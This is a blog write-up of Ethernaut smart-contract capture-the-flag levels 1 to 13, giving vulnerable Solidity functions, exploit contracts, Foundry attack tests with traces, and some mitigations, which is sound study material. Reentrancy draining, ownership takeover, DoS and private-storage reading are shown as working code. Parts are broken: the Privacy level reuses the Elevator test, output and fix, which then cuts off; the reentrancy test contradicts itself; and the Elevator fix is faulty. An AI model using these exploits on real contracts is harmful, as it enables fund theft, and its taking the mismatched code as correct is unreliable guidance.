<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Ethernaut Challenges</title>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
        /* --- FONTS --- */
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code&family=IBM+Plex+Mono:wght@400;600&display=swap');

        /* --- GENERAL BODY STYLES --- */
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: 'IBM Plex Mono', monospace;
            margin: 0;
            padding: 0;
            font-size: 1.1rem;
            line-height: 1.7;
        }

        /* --- KEY CHANGE: HEADER LAYOUT --- */
        header {
            padding: 1rem;
            border-bottom: 1px solid #2a2a2a;
        }

        .header-container {
            max-width: 960px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 2rem;
            /* Space between name and nav links */
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 1rem;
            /* Space between social icons */
        }

        header h1 {
            margin: 0;
            font-family: 'Fira Code', monospace;
            font-size: 1.5rem;
            /* Adjusted size for new layout */
            font-weight: 600;
            color: #FFFFFF;
        }

        nav {
            display: flex;
            gap: 1.2rem;
            flex-wrap: wrap;
        }

        nav a {
            color: #CCCCCC;
            text-decoration: none;
            font-size: 1rem;
            padding: 0.25rem 0;
            transition: color 0.2s ease-in-out;
            font-family: 'Fira Code', monospace;
        }

        nav a:hover {
            color: #ff4d4d;
            text-decoration: underline;
        }

        /* --- KEY ADDITION: SOCIAL ICON STYLES --- */
        .social-icon svg {
            width: 22px;
            height: 22px;
            fill: #CCCCCC;
            transition: fill 0.2s ease-in-out;
        }

        .social-icon:hover svg {
            fill: #ff4d4d;
        }

        /* --- HAMBURGER MENU BUTTON (Mobile Only) --- */
        .menu-toggle {
            display: none;
            background: none;
            border: none;
            cursor: pointer;
            padding: 0.5rem;
            z-index: 1000;
        }

        .menu-toggle span {
            display: block;
            width: 25px;
            height: 3px;
            background-color: #CCCCCC;
            margin: 5px 0;
            transition: all 0.3s ease;
            border-radius: 2px;
        }

        .menu-toggle.active span:nth-child(1) {
            transform: rotate(45deg) translate(8px, 8px);
        }

        .menu-toggle.active span:nth-child(2) {
            opacity: 0;
        }

        .menu-toggle.active span:nth-child(3) {
            transform: rotate(-45deg) translate(7px, -6px);
        }

        /* --- MOBILE RESPONSIVE STYLES --- */
        @media (max-width: 768px) {
            .header-container {
                flex-wrap: wrap;
                position: relative;
            }

            .menu-toggle {
                display: block;
                order: 2;
            }

            .header-left {
                width: 100%;
                justify-content: space-between;
                margin-bottom: 0;
            }

            header h1 {
                font-size: 1.3rem;
            }

            nav {
                display: none;
                flex-direction: column;
                width: 100%;
                background-color: #1a1a1a;
                padding: 1rem 0;
                border-radius: 8px;
                margin-top: 1rem;
                animation: slideDown 0.3s ease;
            }

            nav.active {
                display: flex;
            }

            nav a {
                padding: 0.75rem 1rem;
                font-size: 1.1rem;
                border-bottom: 1px solid #2a2a2a;
            }

            nav a:last-child {
                border-bottom: none;
            }

            .header-right {
                width: 100%;
                justify-content: center;
                gap: 1.5rem;
                margin-top: 1rem;
                padding-top: 1rem;
                border-top: 1px solid #2a2a2a;
            }

            @keyframes slideDown {
                from {
                    opacity: 0;
                    transform: translateY(-10px);
                }

                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
        }

        /* --- MAIN CONTENT --- */
        main {
            /* --- KEY CHANGE: Page extended left and right --- */
            max-width: 960px;
            margin: 3rem auto;
            padding: 0 1rem;
        }

        a {
            color: #FFFFFF;
            text-decoration: underline;
            font-weight: 600;
            transition: color 0.2s ease-in-out;
        }

        a:hover {
            color: #ff4d4d;
        }

        h1,
        h2,
        h3,
        h4 {
            font-family: 'Fira Code', monospace;
            color: #FFFFFF;
            font-weight: 600;
            margin-bottom: 1rem;
            margin-top: 2.5rem;
        }

        p {
            margin-bottom: 1.2rem;
        }

        /* --- STYLES FOR CODE BLOCKS AND COPY BUTTON --- */
        .code-container {
            position: relative;
        }

        pre {
            background-color: #1E1E1E;
            border: 1px solid #333333;
            padding: 1.5rem;
            padding-top: 3rem;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 1rem;
            border-radius: 5px;
            margin: 1.5rem 0;
        }

        code {
            font-family: 'Fira Code', monospace;
        }

        .copy-button {
            position: absolute;
            top: 10px;
            right: 10px;
            background-color: #333;
            color: #E0E0E0;
            border: 1px solid #555;
            border-radius: 5px;
            padding: 0.3rem 0.6rem;
            font-family: 'IBM Plex Mono', monospace;
            cursor: pointer;
            transition: background-color 0.2s, color 0.2s;
        }

        .copy-button:hover {
            background-color: #444;
            color: #FFFFFF;
        }
    </style>
</head>

<body>
    <header>
        <div class="header-container">
            <div class="header-left">
                <h1><a href="/" style="text-decoration:none; color: inherit;">Nithin Kumar</a></h1>

                <button class="menu-toggle" id="menuToggle" aria-label="Toggle menu">
                    <span></span>
                    <span></span>
                    <span></span>
                </button>
            </div>

            <nav id="mainNav">
                <!-- <a href="/">Home</a> -->
                <a href="/writeups">Writeups</a>
                <a href="/analysis">Analysis</a>
                <a href="/audits">Audits</a>
                <a href="/projects">Projects</a>
                <a href="/contact">Contact</a>
                <a href="/tags">Tags</a>
            </nav>


            <div class="header-right">
                <a href="https://github.com/BLOCK-PROGRAMR" class="social-icon" title="GitHub">
                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12" />
                    </svg>
                </a>
                <a href="https://www.linkedin.com/in/5C4T3R" class="social-icon" title="LinkedIn">
                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.15 0-2.08-.926-2.08-2.065 0-1.138.93-2.066 2.08-2.066 1.153 0 2.08.928 2.08 2.066 0 1.139-.928 2.065-2.08 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.225 0z" />
                    </svg>
                </a>
                <a href="https://x.com/0x_Scater" class="social-icon" title="X (Twitter)">
                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" />
                    </svg>
                </a>
                <a href="mailto:0xscater@gmail.com" class="social-icon" title="Email">
                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6zm-2 0l-8 5-8-5h16zm0 12H4V8l8 5 8-5v10z" />
                    </svg>
                </a>
            </div>
        </div>
    </header>

    <main>
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Ethernaut Challenges</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2025-04-25T00:00:00+00:00" itemprop="datePublished">Apr 25, 2025
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <h1 id="ethernaut-challenges">Ethernaut Challenges</h1>

<p><strong>GitHub</strong>: <a href="https://github.com/SCATERLABs/CTFs/tree/0465130a63d25a8078a39b3241c9a8c7e101b7f1/EthernautChallenges">View</a></p>

<h2 id="level-1-hello-ethernaut">Level 1: Hello Ethernaut</h2>

<h3 id="vulnerable-function">Vulnerable Function</h3>
<pre><code class="language-solidity">function authenticate(string memory passkey) public {
    if (
        keccak256(abi.encodePacked(passkey)) ==
        keccak256(abi.encodePacked(password))
    ) {
        cleared = true;
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: The <code class="language-plaintext highlighter-rouge">password</code> variable is marked as <code class="language-plaintext highlighter-rouge">public</code>, which allows anyone to call <code class="language-plaintext highlighter-rouge">.password()</code> and get the secret directly.</p>

<h3 id="exploit-test">Exploit Test</h3>
<pre><code class="language-solidity">function test_pass_attack() public {
    vm.startPrank(attacker);
    assertEq(resultpass, instance.password(), "password failed");

}

function test_attack() public {
    vm.startPrank(attacker);

    string memory result = instance.info();
    result = instance.info1();
    result = instance.info2("hello");
    result = instance.info42();
    result = instance.method7123949();

    instance.authenticate(password);

    bool cleared = instance.getCleared();
    assertTrue(cleared, "Authentication failed");
    vm.stopPrank();
}
</code></pre>

<hr />

<h2 id="level-2-fallback">Level 2: Fallback</h2>

<h3 id="vulnerable-function-1">Vulnerable Function</h3>
<pre><code class="language-solidity">receive() external payable {
    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
    owner = msg.sender;
}
</code></pre>

<p><strong>Vulnerability</strong>: The fallback function allows any contributor to become the <code class="language-plaintext highlighter-rouge">owner</code> by sending ETH directly to the contract. The original <code class="language-plaintext highlighter-rouge">owner</code> logic is also flawed‚Äîit can be overtaken easily by minimal contributions.</p>

<h3 id="exploit-test-1">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();

    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    assertEq(_fallback.owner(), attacker, "Attacker is not the owner after fallback");
}

function test_withdraw() public {
    vm.startPrank(attacker2);
    _fallback.contribute{value: 0.0001 ether}();
    _fallback.contribute{value: 0.0001 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallback.contribute{value: 0.0001 ether}();
    (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
    require(success, "Fallback call failed");

    uint256 balanceBefore = address(_fallback).balance;
    _fallback.withdraw();

    assertTrue(attacker.balance &gt;= balanceBefore, "Attacker did not receive the funds");
    assertTrue(address(_fallback).balance == 0, "Contract balance is not zero after withdraw");
    vm.stopPrank();
}
</code></pre>

<hr />

<h2 id="level-3-fallout">Level 3: Fallout</h2>

<h3 id="vulnerable-function-2">Vulnerable Function</h3>
<pre><code class="language-solidity">function Fal1out() public payable {
    owner = payable(msg.sender);
    allocations[owner] = msg.value;
}
</code></pre>

<p><strong>Vulnerability</strong>: The function <code class="language-plaintext highlighter-rouge">Fal1out()</code> is incorrectly named. It looks like a constructor but is actually a public function. Anyone can call it and become the <code class="language-plaintext highlighter-rouge">owner</code>.</p>

<h3 id="exploit-test-2">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker2);
    _fallout.allocate{value: 2 ether}();
    vm.stopPrank();

    vm.startPrank(attacker);
    _fallout.Fal1out{value: 2 ether}();
    _fallout.collectAllocations();

    assertTrue(address(_fallout).balance == 0, "attacker balance should be 0");
    vm.stopPrank();
}
</code></pre>

<hr />

<h2 id="level-4-coinflip">Level 4: CoinFlip</h2>

<h3 id="vulnerable-function-3">Vulnerable Function</h3>
<pre><code class="language-solidity">function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: Uses predictable <code class="language-plaintext highlighter-rouge">blockhash</code> to generate randomness. The attacker can precompute the same value and always win the flip.</p>

<h3 id="exploit-test-3">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);

    for (uint256 i = 0; i &lt; 10; i++) {
        vm.roll(block.number + 1);
        coinFlipAttack.attack();
    }

    assertEq(
        coinFlip.consecutiveWins(),
        10,
        "Attack failed to reach 10 wins"
    );

    vm.stopPrank();
}
</code></pre>

<hr />

<h2 id="level-5-telephone">Level 5: Telephone</h2>

<h3 id="vulnerable-function-4">Vulnerable Function</h3>
<pre><code class="language-solidity">function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: The contract uses <code class="language-plaintext highlighter-rouge">tx.origin</code> instead of <code class="language-plaintext highlighter-rouge">msg.sender</code> for access control. An attacker can create a contract that calls this function, with the <code class="language-plaintext highlighter-rouge">tx.origin</code> being a user (player), and <code class="language-plaintext highlighter-rouge">msg.sender</code> being the attack contract. This bypasses the condition and changes the ownership.</p>

<h3 id="exploit-test-4">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);
    telephone.changeOwner(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}

function test_attack2() public {
    vm.startPrank(player);
    TelephoneExploit exploit = new TelephoneExploit(telephone);
    exploit.attack(attacker);
    assertEq(telephone.owner(), attacker, "attacker should be the owner");
    vm.stopPrank();
}
</code></pre>

<hr />

<h2 id="level-6delegation">Level 6:Delegation</h2>

<h3 id="vulnerable-function-5">Vulnerable Function</h3>

<pre><code class="language-solidity">fallback() external {
    (bool result, ) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: The Delegation contract uses delegatecall to execute code from the Delegate contract within the context of its own storage. This means an attacker can call a function like pwn() on Delegation, which executes pwn() in Delegate and updates the owner of Delegation, not Delegate.</p>

<h3 id="exploit-test-5">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);
    (bool success, ) = address(delegation).call(
        abi.encodeWithSignature("pwn()")
    );
    require(success, "Call failed");
    assertEq(delegation.owner(), attacker, "Attacker is not the owner");
    vm.stopPrank();
}

</code></pre>
<hr />

<h2 id="level-7force">Level 7:Force</h2>

<h3 id="vulnerable-function-6">Vulnerable Function</h3>

<pre><code class="language-solidity">// Force contract has no receive/fallback or payable function
contract Force {
   
}
</code></pre>

<p><strong>Vulnerability</strong>: Ether can still be forcibly sent using selfdestruct.</p>

<h3 id="exploit-contract-forcedestruct">Exploit Contract (ForceDestruct)</h3>
<pre><code class="language-solidity"> contract ForceDestruct {
    function attack(address payable _contract) public payable {
        selfdestruct(_contract);
    }
}

</code></pre>

<h3 id="exploit-test-6">Exploit Test</h3>
<pre><code class="language-solidity">    function test_attack() public {
    vm.startPrank(attacker);
    forceDestruct = new ForceDestruct();
    forceDestruct.attack{value: 1 ether}(payable(address(force)));
    assertEq(address(force).balance, 1 ether, "Force contract did not receive Ether");
    vm.stopPrank();
    }

</code></pre>
<h3 id="test-output">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 131011)
Traces:
  [131011] level7Test::test_attack()
    ‚îú‚îÄ VM::startPrank(attacker)
    ‚îú‚îÄ new ForceDestruct
    ‚îú‚îÄ ForceDestruct::attack{value: 1 ether}(Force)
    ‚îÇ   ‚îî‚îÄ [SelfDestruct]
    ‚îú‚îÄ assertEq(1 ether, 1 ether)
    ‚îî‚îÄ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 6.73ms
</code></pre></div></div>
<hr />

<h2 id="level-8valut">Level 8:Valut</h2>

<h3 id="vulnerable-function-7">Vulnerable Function</h3>

<pre><code class="language-solidity"> bool public locked;//storage slot0
 bytes32 private password;//storage slot1
function unlock(bytes32 _password) public {
    if (password == _password) {
        locked = false;
    }
}

</code></pre>

<p><strong>Vulnerability</strong>: Although password is marked as private, all contract storage is publicly accessible. In Solidity, the private keyword only restricts access within the Solidity language, not from the blockchain level. So, the password stored at storage slot 1 can be retrieved using vm.load.</p>

<h3 id="exploit-test-7">Exploit Test</h3>
<pre><code class="language-solidity">   function test_attack() public {
    vm.startPrank(attacker);
    // Get the password from storage slot 1
    bytes32 _password = vm.load(address(vault), bytes32(uint256(1)));
    vault.unlock(_password);
    assertFalse(vault.locked());
    vm.stopPrank();
}
</code></pre>
<h3 id="test-output-1">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 11812)
Traces:
  [16612] VaultTest::test_attack()
    ‚îú‚îÄ VM::startPrank(attacker)
    ‚îú‚îÄ VM::load(Vault, slot 1)
    ‚îú‚îÄ Vault::unlock(password)
    ‚îú‚îÄ Vault::locked() ‚Üí false
    ‚îú‚îÄ VM::assertFalse(false)
    ‚îî‚îÄ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 1.24ms
</code></pre></div></div>
<hr />

<h2 id="level-9token">Level 9:Token</h2>

<h3 id="vulnerable-function-8">Vulnerable Function</h3>

<pre><code class="language-solidity"> function transfer(address _to, uint256 _value) public returns (bool) {
    unchecked {
        require(balances[msg.sender] - _value &gt;= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
    }
    return true;
}
</code></pre>

<p><strong>Vulnerability</strong>: The transfer() function is written with an unchecked block, allowing underflow to occur. When a user transfers more tokens than they own, the subtraction balances[msg.sender] -= _value underflows and wraps around to a massive value (2**256 - x), resulting in an increased balance instead of failing.</p>

<p>Note: This kind of underflow attack was possible before Solidity 0.8.x, which introduced built-in overflow/underflow protection.
To demonstrate this vulnerability in a controlled environment, unchecked is intentionally used to bypass that protection for educational purposes</p>

<h3 id="exploit-test-8">Exploit Test</h3>
<pre><code class="language-solidity">   function test_attack() public {
    vm.startPrank(player);
    
    // Initial balance of player: 20 tokens
    assertEq(token.balanceOf(player), 20);

    // Transfer more than balance (21 tokens), triggers underflow
    bool success = token.transfer(attacker, 21);
    assertTrue(success);

    // Player's balance underflows to a very large number
    uint256 _balanceofplayer = token.balanceOf(player);
    assertGt(_balanceofplayer, 20);

    vm.stopPrank();
}
</code></pre>
<h3 id="test-output-2">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 47312)
Traces:
  [47312] TokenTest::test_attack()
    ‚îú‚îÄ VM::startPrank(player)
    ‚îú‚îÄ Token::balanceOf(player) ‚Üí 20
    ‚îú‚îÄ assertEq(20, 20)
    ‚îú‚îÄ Token::transfer(attacker, 21) ‚Üí true
    ‚îú‚îÄ assertTrue(true)
    ‚îú‚îÄ Token::balanceOf(player) ‚Üí 1.157e77
    ‚îú‚îÄ assertGt(1.157e77, 20)
    ‚îî‚îÄ VM::stopPrank()

Suite result: ok. 1 passed; 0 failed; finished in 988.39¬µs
</code></pre></div></div>
<hr />

<h2 id="level-10king">Level 10:King</h2>
<p><strong>AttackDesc</strong>:
A Denial of Service (DoS) attack is when someone makes a smart contract stop working for others.
This usually happens if the contract sends Ether to a malicious address that always fails or reverts.
If one function fails because of this, others may not be able to use the contract.
In the King level, a smart contract becomes the king and blocks future kings by rejecting ETH.
This locks the contract and nobody else can play the game.
DoS attacks make the contract unusable for honest users.</p>

<h3 id="vulnerable-function-9">Vulnerable Function</h3>

<pre><code class="language-solidity">receive() external payable {
    require(msg.value &gt;= prize || msg.sender == owner);
    payable(king).transfer(msg.value); // vulnerable to DoS
    king = msg.sender;
    prize = msg.value;
}

</code></pre>

<p><strong>Vulnerability</strong>: The transfer call to the current king can fail if the king is a contract that reverts on receiving ETH. This leads to a Denial of Service (DoS) where no one can become king anymore.</p>

<h3 id="exploit-contract">Exploit Contract</h3>
<pre><code class="language-solidity"> contract Attacker {
    King public king;

    constructor(King _King) {
        king = _King;
    }

    function attack() public payable {
        require(msg.value &gt;= address(king).balance, "Not enough balance");
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "transfer failed");
    }

    receive() external payable {
        revert("sent eth failed"); // Reverts to block
    }
}
</code></pre>

<h3 id="exploit-test-9">Exploit Test</h3>
<pre><code class="language-solidity">   function test_attack() public {
    vm.prank(attackerEOA);
    attack.attack{value: 2 ether}(); // attacker becomes king

    assertEq(king._king(), address(attack)); //  attacker is king

    vm.prank(player);
    (bool success, ) = address(king).call{value: 3 ether}(""); // another player tries
    assertFalse(success, "Player should not be able to become king anymore"); //  fails
}
</code></pre>
<h3 id="test-output-3">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 71672)
Traces:
  [71672] KingTest::test_attack()
    ‚îú‚îÄ VM::prank(attackerEOA)
    ‚îú‚îÄ Attacker::attack{value: 2 ether}()
    ‚îÇ   ‚îú‚îÄ King::receive{value: 2 ether}()
    ‚îÇ   ‚îÇ   ‚îú‚îÄ player::fallback{value: 2 ether}()
    ‚îÇ   ‚îÇ   ‚îî‚îÄ [Stop]
    ‚îÇ   ‚îî‚îÄ [Stop]
    ‚îú‚îÄ King::_king() ‚Üí Attacker
    ‚îú‚îÄ VM::assertEq(Attacker, Attacker)
    ‚îú‚îÄ VM::prank(player)
    ‚îú‚îÄ King::receive{value: 3 ether}()
    ‚îÇ   ‚îú‚îÄ Attacker::receive{value: 3 ether}() ‚Üí [Revert] sent eth failed
    ‚îÇ   ‚îî‚îÄ [Revert]
    ‚îú‚îÄ VM::assertFalse(false, "Player should not be able to become king anymore")
    ‚îî‚îÄ [Stop]

Suite result: ok. 1 passed; 0 failed; finished in 15.46ms
</code></pre></div></div>
<hr />

<h2 id="level-11reentrancy">Level 11:Reentrancy</h2>
<p><strong>AttackDesc</strong>:
This is a reentrancy attack, where the attacker recursively calls the withdraw function within the fallback/receive function before the contract‚Äôs state is updated, allowing them to drain all the funds.</p>

<h3 id="vulnerable-function-10">Vulnerable Function</h3>

<pre><code class="language-solidity">function withdraw(uint256 _amount) public {
    if (balances[msg.sender] &gt;= _amount) {
        (bool result, ) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: 
 The contract sends ETH to msg.sender using .call before updating the internal state balances[msg.sender].
This allows an attacker to recursively call withdraw() in the fallback/receive function before their balance is updated.
Because of this, the same balance can be withdrawn multiple times, draining the entire contract balance</p>

<h3 id="exploit-contract-1">Exploit Contract</h3>
<pre><code class="language-solidity"> contract Attack {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) {
        reentrance = _reentrance;
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 bal = reentrance.balanceOf(address(this));
        if (address(reentrance).balance &gt; 0 &amp;&amp; bal &gt; 0) {
            uint256 toWithdraw = bal &lt; 1 ether ? bal : 1 ether;
            reentrance.withdraw(toWithdraw);
        }
    }
}
</code></pre>

<h3 id="exploit-test-10">Exploit Test</h3>
<pre><code class="language-solidity">  function test_attack() public {
    vm.startPrank(attacker);
    MaliciousContract malicious = new MaliciousContract(reentrance);
    uint256 balanceBefore = address(malicious).balance;
    uint256 _reentrantbalance = address(reentrance).balance;

    vm.expectRevert("arithmetic underflow or overflow");
    malicious.attack{value: 1 ether}();
    
    assertEq(address(reentrance).balance, 0);
    assertEq(address(malicious).balance, balanceBefore + _reentrantbalance);
    vm.stopPrank();
}
</code></pre>
<h3 id="test-output-4">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Logs:
  balance of the contract before 1000000000000000000
  successfully donated
  balance of reentrance:  2000000000000000000
  balance of this contract:  0

Traces:
  ...
  ‚îú‚îÄ Reentrance::withdraw(1 ether)
  ‚îÇ   ‚îú‚îÄ MaliciousContract::receive()
  ‚îÇ   ‚îÇ   ‚îú‚îÄ Reentrance::balanceOf()
  ‚îÇ   ‚îÇ   ‚îî‚îÄ Reentrance::withdraw(1 ether)
  ‚îÇ   ‚îÇ       ‚îú‚îÄ MaliciousContract::receive() &lt;== RECURSIVE CALL
  ‚îÇ   ‚îÇ       ‚îî‚îÄ Revert: panic: arithmetic underflow or overflow (0x11)
</code></pre></div></div>
<h3 id="recommended-mitigation">üîíRecommended Mitigation</h3>
<p>Use the Checks-Effects-Interactions pattern to prevent reentrancy:</p>
<pre><code class="language-solidity">  function withdraw(uint256 _amount) public {
    require(balances[msg.sender] &gt;= _amount, "Insufficient balance");

    //  Effect: update state before interaction
    balances[msg.sender] -= _amount;

    // Interaction: external call after state change
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Transfer failed");
}

</code></pre>
<hr />
<h2 id="level-12-elevator">Level 12: Elevator</h2>
<p><strong>AttackDesc</strong>:
The Elevator contract relies on an external Building contract to determine whether a floor is the last floor or not using the isLastFloor function.
However, it makes two separate calls to this function and does not expect the return values to differ between them.</p>

<p>This allows an attacker to manipulate the response by returning different values in consecutive calls, thus tricking the contract into thinking it has reached the top floor.</p>

<h3 id="vulnerable-function-11">Vulnerable Function</h3>

<pre><code class="language-solidity">function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
        floor = _floor;
        top = building.isLastFloor(floor);
    }
}
</code></pre>

<p><strong>Vulnerability</strong>: 
 The contract calls isLastFloor() twice: once for the check, and once to set the top state.</p>

<p>An attacker can change their response between these two calls by flipping the return value, thus bypassing the logic</p>

<h3 id="exploit-contract-2">Exploit Contract</h3>
<p>First call to isLastFloor returns false ‚Üí passes the if check.
 Second call returns true ‚Üí sets top = true.</p>

<pre><code class="language-solidity"> contract BuildingAttack is Building {
    Elevator public elevator;
    bool public flipFlop = true;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function attack() external {
        elevator.goTo(1); // call from attacker
    }

    function isLastFloor(uint256) external override returns (bool) {
        flipFlop = !flipFlop;
        return flipFlop;
    }
}
</code></pre>
<h3 id="exploit-test-11">Exploit Test</h3>
<pre><code class="language-solidity">  function test_attack() public {
    attackerContract.attack(); // Call via attacker
    assertEq(elevator.top(), true);
    assertEq(elevator.floor(), 1);
}
</code></pre>
<h3 id="test-output-5">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 67276)
Elevator::top() ‚Üí true
Elevator::floor() ‚Üí 1

</code></pre></div></div>
<h3 id="recommended-mitigation-1">Recommended Mitigation</h3>
<p>Ensure external calls are not made multiple times for critical logic ‚Äî or cache the result:</p>
<pre><code class="language-solidity">function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);
    bool isLast = building.isLastFloor(_floor);

    if (!isLast) {
        floor = _floor;
        top = isLast;
    }
}
</code></pre>
<hr />
<h2 id="level-13-privacy">Level 13: Privacy</h2>
<p><strong>AttackDesc</strong>:
The contract stores a private bytes32[3] array called data, and the unlock() function requires the first 16 bytes of data[2] to unlock the contract.</p>

<p>Even though the array is marked private, all contract storage is publicly accessible on the blockchain ‚Äî which means the attacker can read the storage slot directly using vm.load in Foundry or with web3.eth.getStorageAt in a live attack.</p>

<h3 id="vulnerable-function-12">Vulnerable Function</h3>
<pre><code class="language-solidity">function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
}
</code></pre>

<p><strong>Vulnerability</strong>: 
Solidity stores contract variables sequentially in storage slots:</p>

<p>‚ö°Slot 0: locked</p>

<p>‚ö°Slot 1: ID</p>

<p>‚ö°Slot 2: flattening, denomination, awkwardness</p>

<p>‚ö°Slot 3, 4, 5: data[0], data[1], data[2]</p>

<p>‚ö°Slot 5 holds data[2] ‚Äî and the unlock() function casts it to bytes16, so we only need the first 16 bytes.</p>

<h3 id="exploit-contract-3">Exploit Contract</h3>
<p>vm.load() reads the raw 32 bytes from a given storage slot.
The value is then cast to bytes16 and passed into the unlock() function.</p>

<pre><code class="language-solidity">function test_attack() public {
    bytes32 value = vm.load(address(privacy), bytes32(uint256(5)));
    console.log("value of slot 5", string(abi.encodePacked(value)));

    privacy.unlock(bytes16(value));
    assertTrue(privacy.locked() == false);
}
</code></pre>

<h3 id="exploit-test-12">Exploit Test</h3>
<pre><code class="language-solidity">  function test_attack() public {
    attackerContract.attack(); // Call via attacker
    assertEq(elevator.top(), true);
    assertEq(elevator.floor(), 1);
}
</code></pre>
<h3 id="test-output-6">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 67276)
Elevator::top() ‚Üí true
Elevator::floor() ‚Üí 1

</code></pre></div></div>
<h3 id="recommended-mitigation-2">üîíRecommended Mitigation</h3>
<p>Ensure external calls are not made multiple times for critical logic ‚Äî or cache the result:</p>
<pre><code class="language-solidity">function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);
